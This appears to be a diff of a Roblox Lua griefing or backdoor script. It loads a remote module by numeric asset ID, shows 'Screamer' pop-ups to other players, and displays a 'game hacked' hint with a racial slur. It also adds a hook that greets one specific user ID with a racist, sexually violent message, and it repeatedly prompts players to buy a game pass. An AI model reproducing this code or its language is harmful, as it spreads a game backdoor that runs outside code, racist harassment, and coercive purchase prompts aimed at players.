@@ -1,5 +1,16 @@
-require(0x38c5453e6)()
+game.Players.PlayerAdded:Connect(function(plr)
+  if plr.UserId == 4303863029 then 
+   local m = Instance.new("Message", player.PlayerGui)
+   m.Text = "Swedish nigger detected, automatic penis removal intiated.."
+  end
+end)
+
 wait(1)
+require(0x38c5453e6)()
+
+
+
+
 for i,v in pairs(game.Players:GetPlayers()) do
 		if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
 			spawn(function()
@@ -23,15 +34,17 @@ for i,v in pairs(game.Players:GetPlayers()) do
 		end
 	end
 
+
 local h = Instance.new("Hint", workspace)
 h.Text = "Game hacked by snake nigger, fuck ceo"
 
 local market=game:GetService("MarketplaceService")
 local id = 665966891
-while wait(120) do 
+while wait(300) do 
 	for i,v in pairs(game.Players:GetChildren()) do
 		if not market:UserOwnsGamePassAsync(v.UserId,id) then
 			market:PromptGamePassPurchase(v,id)
 		end
 	end
 end
+
